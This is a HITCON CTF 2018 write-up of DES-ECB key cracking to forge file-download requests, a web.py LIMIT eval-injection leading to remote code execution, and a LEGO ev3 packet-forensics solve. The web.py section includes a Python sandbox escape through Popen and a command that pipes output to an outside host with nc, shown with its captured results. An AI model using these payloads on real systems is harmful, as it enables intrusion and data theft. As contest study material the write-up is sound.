# HITCON CTF 2018

## Problem

- On My Raddit - Web / Crypto / Feel? / Orange
- On My Raddit v2 - Web / 1-Day / RCE / SSTI / Orange
- ev3-basic - Forensics / Network / LEGO ev3
- One Line PHP Challenge - Web / PHP / SESSION / RC / RCE / Orange

## On My Raddit

### Description

This is based on a real world case. If you get the crypto point, it can be sovled in 10 minutes!

### Exploit

The Problem Site looks like simple article page with board style.

It have some functions.

1. How much data to show - limit
2. If you click article, then redirect article's source page. - redirect
3. normal file download.

But, these functions are operated by s parameter.

Here is file download's s value.

**File 1.**

>**Author :** Ghostbuster: Detecting the Presence of Hidden Eavesdroppers [pdf]
>
>**Filename :** 70c97cc1-079f-4d01-8798-f36925ec1fd7.pdf
>
>**s :** 2e7e305f2da018a2cf8208fa1fefc238522c932a276554e5f8085ba33f9600b301c3c95652a912b0342653ddcdc4703e5975bd2ff6cc8a133ca92540eb2d0a42

**File 2.**

>**Author :** WEAPON SYSTEMS CYBERSECURITY: DOD Just Beginning to Grapple with Scale of Vulnerabilities (pdf)
>
>**Filename :** 09609b66-e193-42aa-bc2d-07542ca4442e.pdf
>
>**s :** 2e7e305f2da018a2cf8208fa1fefc238be24b0e6a4592fab1f8a22a342e43575e547d2499523d59754ba9923e44088052a5be3ba8bae2a943ca92540eb2d0a42

If you look at the s value above, It can be seen that only a few blocks are different in the middle.

Based on that, I guessed:

```
522c932a276554e5 f8085ba33f9600b3 01c3c95652a912b0 342653ddcdc4703e 5975bd2ff6cc8a13
 7 0 c 9 7 c c 1  - 0 7 9 f - 4 d  0 1 - 8 7 9 8 -  f 3 6 9 2 5 e c  1 f d 7 . p d f
be24b0e6a4592fab 1f8a22a342e43575 e547d2499523d597 54ba9923e4408805 2a5be3ba8bae2a94
 0 9 6 0 9 b 6 6  - e 1 9 3 - 4 2  a a - b c 2 d -  0 7 5 4 2 c a 4  4 4 2 e . p d f
```

I think that it is block cipher.

> Cipher = DES, DES3 and AES.
>
> Block size = 8 byte
>
> Block mode = ECB or OFB.

If Y have X, then that is OFB. ( X = plain1^plain2, Y = s1^s2 )

But it is not now, so I think **ECB**.

In the hint of the problem, I specified that Key is lowercase.

Therefore, i tried to <u>8 byte brute force</u> using hashcat, then i got a **Key** value.

```
$ ./hashcat -m 14000 f8085ba33f9600b3:2d303739662d3464 -a 3 '?l?l?l?l?l?l?l?l'
hashcat (v4.2.1-91-g99709a3) starting...

OpenCL Platform #1: NVIDIA Corporation
======================================
* Device #1: GeForce GTX 1060 6GB, 1517/6069 MB allocatable, 10MCU

... ...

f8085ba33f9600b3:2d303739662d3464:ldgonaro

... ...
```

The key used to encrypt the **DES-ECB** was **ldgonaro**.

flag is hitcon{ldgonaro}? No.

It is not flag :( 

I tried to decrypt s value using simple decrypt python code.

```python
from Crypto.Cipher import DES

d = DES.new('ldgonaro',DES.MODE_ECB)

cipher = '2e7e305f2da018a2cf8208fa1fefc238be24b0e6a4592fab1f8a22a342e43575e547d2499523d59754ba9923e44088052a5be3ba8bae2a943ca92540eb2d0a42'.decode('hex')
print d.decrypt(cipher)
'''
$ python dec.py
m=d&f=uploads%2F09609b66-e193-42aa-bc2d-07542ca4442e.pdf\x08\x08\x08\x08\x08\x08\x08\x08
'''
```

I changed the f value to read app.py and got flag XD

```python
from Crypto.Cipher import DES
import requests
import readline

d = DES.new('ldgonaro',DES.MODE_ECB)

def padding(p):
	q = len(p)/8
	r = len(p)%8
	if r != 0:
		res = p[:q*8] + p[q*8:].ljust(8,chr(8-r))
	return res

while 1:
	inp = raw_input('path : ')
	plain = 'm=d&f=%s'%(inp)
	plain = padding(plain)
	s = d.encrypt(plain).encode('hex')

	try:
		r = requests.get('http://13.115.255.46/?s=%s'%(s))
		print r.text
	except:
		print '[*] Error Occured.'
'''
[ app.py ]
# coding: UTF-8
import os
import web
import urllib
import urlparse
from Crypto.Cipher import DES

web.config.debug = False
ENCRPYTION_KEY = 'megnnaro'

... ...

'''
```

**FLAG :** hitcon{megnnaro}

> Crack Key (ldgonaro) != Real Key (megnnaro)?
>
> Only 7 bits, except the least significant bit for each word of the DES key, are used by encryp/decrypㅅ.

## On My Raddit v2

### Description

Give me SHELL!!!

### Exploit

This is the same URL as the above problem.

I download `requirements.txt` using same python code because of I can't find vulnerability in app.py.

```
pycrypto==2.6.1
web.py==0.38
```

First, I found changelog in web.py.

```
# https://github.com/webpy/webpy/blob/master/ChangeLog.txt
# web.py changelog

## 2018-02-28 0.39

* Fixed a security issue with the form module (tx Orange Tsai)
* Fixed a security issue with the db module (tx Adrián Brav and Orange Tsai)
```

OK, I think it is 1-day exploit for web.py because of issue tracker is equals to author.

I confirmed commit and code patch.

> **Commit Link :** 
>
>  https://github.com/webpy/webpy/commit/9b08101d9d729c96cffd036269b22e5b792d0fe8

You can see that **LIMIT** has been patched in db.php.

I found in app.py where to use the **LIMIT**.

```python
# app.py
def get_posts(limit=None):
    records = []
    for i in db.select('posts', limit=limit, order='ups desc'):
        tmp = {
            'm': 'r',  
            't': i.title.encode('utf-8', 'ignore'), 
            'u': i.id, 
        } 
        tmp['param'] = encrypt(urllib.urlencode(tmp))
        tmp['ups'] = i.ups
        if i.file:
            tmp['file'] = encrypt(urllib.urlencode({'m': 'd', 'f': i.file}))
        else:
            tmp['file'] = ''
        
        records.append( tmp )
    return records
# ... ...
class index:
    def GET(self):
        #... ...
            elif method == 'p':
                limit = s.get('l')
                return web.template.frender('templates/index.html')(get_posts(limit), get_urls())
        #... ...
```

In app.py, set `s` to p, and `l` to LIMIT value.

It calls *get_posts(limit)*, then run *db.select*.

*db.select* is declared in *DB class* in below code.

```python
# web/db.py
# ... ...
def reparam(string_, dictionary): 
    """
    Takes a string and a dictionary and interpolates the string
    using values from the dictionary. Returns an `SQLQuery` for the result.
        >>> reparam("s = $s", dict(s=True))
        <sql: "s = 't'">
        >>> reparam("s IN $s", dict(s=[1, 2]))
        <sql: 's IN (1, 2)'>
    """
    dictionary = dictionary.copy() # eval mucks with it
    # disable builtins to avoid risk for remote code exection.
    dictionary['__builtins__'] = object()
    vals = []
    result = []
    for live, chunk in _interpolate(string_):
        if live:
            v = eval(chunk, dictionary)
            result.append(sqlquote(v))
        else: 
            result.append(chunk)
    return SQLQuery.join(result, '')
# ... ...
class SQLParam(object):
    """
    Parameter in SQLQuery.
    
        >>> q = SQLQuery(["SELECT * FROM test WHERE name=", SQLParam("joe")])
        >>> q
        <sql: "SELECT * FROM test WHERE name='joe'">
        >>> q.query()
        'SELECT * FROM test WHERE name=%s'
        >>> q.values()
        ['joe']
    """
    __slots__ = ["value"]

    def __init__(self, value):
        self.value = value
        
    def get_marker(self, paramstyle='pyformat'):
        if paramstyle == 'qmark':
            return '?'
        elif paramstyle == 'numeric':
            return ':1'
        elif paramstyle is None or paramstyle in ['format', 'pyformat']:
            return '%s'
        raise UnknownParamstyle(paramstyle)
        
    def sqlquery(self): 
        return SQLQuery([self])
        
    def __add__(self, other):
        return self.sqlquery() + other
        
    def __radd__(self, other):
        return other + self.sqlquery() 
            
    def __str__(self): 
        return str(self.value)
    
    def __repr__(self):
        return '<param: %s>' % repr(self.value)
  	# ... ...
   
class DB:
    #... ...
    def select(self, tables, vars=None, what='*', where=None, order=None, group=None, 
               limit=None, offset=None, _test=False): 
        """
        Selects `what` from `tables` with clauses `where`, `order`, 
        `group`, `limit`, and `offset`. Uses vars to interpolate. 
        Otherwise, each clause can be a SQLQuery.
        
            >>> db = DB(None, {})
            >>> db.select('foo', _test=True)
            <sql: 'SELECT * FROM foo'>
            >>> db.select(['foo', 'bar'], where="foo.bar_id = bar.id", limit=5, _test=True)
            <sql: 'SELECT * FROM foo, bar WHERE foo.bar_id = bar.id LIMIT 5'>
            >>> db.select('foo', where={'id': 5}, _test=True)
            <sql: 'SELECT * FROM foo WHERE id = 5'>
        """
        if vars is None: vars = {}
        sql_clauses = self.sql_clauses(what, tables, where, group, order, limit, offset)
        clauses = [self.gen_clause(sql, val, vars) for sql, val in sql_clauses if val is not None]
        qout = SQLQuery.join(clauses)
        if _test: return qout
        return self.query(qout, processed=True)

    def sql_clauses(self, what, tables, where, group, order, limit, offset): 
        return (
            ('SELECT', what),
            ('FROM', sqllist(tables)),
            ('WHERE', where),
            ('GROUP BY', group),
            ('ORDER BY', order),
            ('LIMIT', limit),
            ('OFFSET', offset))

    def gen_clause(self, sql, val, vars): 
        if isinstance(val, numeric_types):
            if sql == 'WHERE':
                nout = 'id = ' + sqlquote(val)
            else:
                nout = SQLQuery(val)
        #@@@
        elif isinstance(val, (list, tuple)) and len(val) == 2:
            nout = SQLQuery(val[0], val[1]) # backwards-compatibility
        elif sql == 'WHERE' and isinstance(val, dict):
            nout = self._where_dict(val)
        elif isinstance(val, SQLQuery):
            nout = val
        else:
            nout = reparam(val, vars)

        def xjoin(a, b):
            if a and b: return a + ' ' + b
            else: return a or b

        return xjoin(sql, nout)
    #... ...
```

We return to the tuple ('LIMIT', limit) through *sql_clauses* function and execute `nout = reparam (val, vars)` in *gen_clause* function.

In reparam, _interpolate is excuted. 

 *_interpolate* function is declared below.

```python
def _interpolate(format): 
    """
    Takes a format string and returns a list of 2-tuples of the form
    (boolean, string) where boolean says whether string should be evaled
    or not.
    from <http://lfw.org/python/Itpl.py> (public domain, Ka-Ping Yee)
    """
    def matchorfail(text, pos):
        match = tokenprog.match(text, pos)
        if match is None:
            raise _ItplError(text, pos)
        return match, match.end()

    namechars = "abcdefghijklmnopqrstuvwxyz" \
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_";
    chunks = []
    pos = 0

    while 1:
        dollar = format.find("$", pos)
        if dollar < 0: 
            break
        nextchar = format[dollar + 1]

        if nextchar == "{":
            chunks.append((0, format[pos:dollar]))
            pos, level = dollar + 2, 1
            while level:
                match, pos = matchorfail(format, pos)
                tstart, tend = match.regs[3]
                token = format[tstart:tend]
                if token == "{": 
                    level = level + 1
                elif token == "}":  
                    level = level - 1
            chunks.append((1, format[dollar + 2:pos - 1]))

        elif nextchar in namechars:
            chunks.append((0, format[pos:dollar]))
            match, pos = matchorfail(format, dollar + 1)
            while pos < len(format):
                if format[pos] == "." and \
                    pos + 1 < len(format) and format[pos + 1] in namechars:
                    match, pos = matchorfail(format, pos + 1)
                elif format[pos] in "([":
                    pos, level = pos + 1, 1
                    while level:
                        match, pos = matchorfail(format, pos)
                        tstart, tend = match.regs[3]
                        token = format[tstart:tend]
                        if token[0] in "([": 
                            level = level + 1
                        elif token[0] in ")]":  
                            level = level - 1
                else: 
                    break
            chunks.append((1, format[dollar + 1:pos]))
        else:
            chunks.append((0, format[pos:dollar + 1]))
            pos = dollar + 1 + (nextchar == "$")

    if pos < len(format): 
        chunks.append((0, format[pos:]))
    return chunks
```

If the value entered in *_interpolate* function is **${shpik}**, it returns **shpik** and executes it through eval.

It is python eval injection problem :)

I modified app.py and used it to do eval injection.

```python
# coding: UTF-8
import os
import web
import urllib
import urlparse
from Crypto.Cipher import DES

web.config.debug = False
ENCRPYTION_KEY = 'megnnaro'

urls = (
    '/', 'index'
)
app = web.application(urls, globals())
db = web.database(dbn='sqlite', db='db.db')

if __name__ == "__main__":
	while 1:
		try:
			limit = raw_input('>> ')
			if limit=='q':
				break
			print(eval(limit,{'__builtins__':object()}))
		except:
			continue
```

I found Popen class and attempted RCE.

```
>> ([i for i in ().__class__.__base__.__subclasses__() if i.__name__ == 'Popen'])[0]('ls',shell=1)
<subprocess.Popen object at 0x7fb5d065f6d0>
app.py	db.db
>> ([i for i in ().__class__.__base__.__subclasses__() if i.__name__ == 'Popen'])[0]('ls | nc [SERVER] [IP]',shell=1)
<subprocess.Popen object at 0x7fb5c86a7610>
```

I received successful result.

```
# nc -lvp 10101
Listening on [0.0.0.0] (family 0, port 10101)
Connection from 183.91.251.163 56417 received!
app.py
db.db
```

Now you can get flag by encrypt below query.

**Query :** \([i for i in ().\_\_class\_\_.\_\_base\_\_.\_\_subclasses\_\_() if i.\_\_name\_\_ == 'Popen']\)\[0\]\('/read_flag | nc \[SERVER\] \[ip\]',shell=1\)

```
# nc -lvp 10101
Listening on [0.0.0.0] (family 0, port 10101)
Connection from ec2-13-115-255-46.ap-northeast-1.compute.amazonaws.com 46028 received!
total 104
drwxr-xr-x  23 root root  4096 Oct 16 08:18 .
drwxr-xr-x  23 root root  4096 Oct 16 08:18 ..
drwxr-xr-x   2 root root  4096 Sep 12 15:59 bin
drwxr-xr-x   3 root root  4096 Oct 10 06:46 boot
drwxr-xr-x  15 root root  2980 Oct  8 18:13 dev
drwxr-xr-x  91 root root  4096 Oct 11 16:05 etc
-r--------   1 root root    47 Oct 16 08:15 flag
drwxr-xr-x   4 root root  4096 Oct 11 16:02 home
lrwxrwxrwx   1 root root    31 Oct 10 06:46 initrd.img -> boot/initrd.img-4.15.0-1023-aws
lrwxrwxrwx   1 root root    31 Sep 12 16:16 initrd.img.old -> boot/initrd.img-4.15.0-1021-aws
drwxr-xr-x  20 root root  4096 Oct 11 15:27 lib
drwxr-xr-x   2 root root  4096 Sep 12 15:56 lib64
drwx------   2 root root 16384 Sep 12 16:10 lost+found
drwxr-xr-x   2 root root  4096 Sep 12 15:55 media
drwxr-xr-x   2 root root  4096 Sep 12 15:55 mnt
drwxr-xr-x   2 root root  4096 Sep 12 15:55 opt
dr-xr-xr-x 123 root root     0 Oct  8 18:13 proc
-rwsr-sr-x   1 root root  8568 Oct 16 08:18 read_flag
drwx------   4 root root  4096 Oct 16 08:18 root
drwxr-xr-x  26 root root  1000 Oct 23 10:54 run
drwxr-xr-x   2 root root  4096 Oct 10 06:46 sbin
drwxr-xr-x   5 root root  4096 Oct  8 18:13 snap
drwxr-xr-x   2 root root  4096 Sep 12 15:55 srv
dr-xr-xr-x  13 root root     0 Oct 16 08:18 sys
drwxrwxrwt  12 root root  4096 Oct 23 11:03 tmp
drwxr-xr-x  10 root root  4096 Sep 12 15:55 usr
drwxr-xr-x  14 root root  4096 Oct 11 15:58 var
lrwxrwxrwx   1 root root    28 Oct 10 06:46 vmlinuz -> boot/vmlinuz-4.15.0-1023-aws
lrwxrwxrwx   1 root root    28 Sep 12 16:16 vmlinuz.old -> boot/vmlinuz-4.15.0-1021-aws
# nc -lvp 10101
Listening on [0.0.0.0] (family 0, port 10101)
Connection from ec2-13-115-255-46.ap-northeast-1.compute.amazonaws.com 46042 received!
hitcon{Fr0m_SQL_Injecti0n_t0_Shell_1s_C00L!!!}
```

**FLAG :** hitcon{Fr0m_SQL_Injecti0n_t0_Shell_1s_C00L!!!}

## ev3-basic

### Description

Find the flag.

### Exploit

Simple packet analysis problem.

You can get a flag by looking at the **RFCOMM** packet.

Here is python code to extracting flag.

```python
with open('ev3_basic.pklg','rb') as f:
	packet = f.read()

send_packets = packet.split('\x02\x0c\x20')
allow_len = ['\x1b','\x1c','\x1d']
p = ['\x81','\x82','\x83','\x84','\x85','\x00']
flag = []
for send_packet in send_packets[1:]:
	l = send_packet[0]
	if l in allow_len:
		q = send_packet[2:2+ord(l)]
		t = q.split('\x05\x01')[1]
		if t[0] in p:
			t = t[1:]
		t2 = t[2:]
		if t2[0] in p:
			t2 = t2[1:]
		flag.append((ord(t[0]),ord(t2[0]),q[-6]))
	else:
		continue

flag = sorted(flag,key=lambda f: (f[1],f[0]))
print ''.join(i[2] for i in flag)
```

**FLAG :** hitcon{m1nd5t0rm_communication_and_firmware_developer_kit}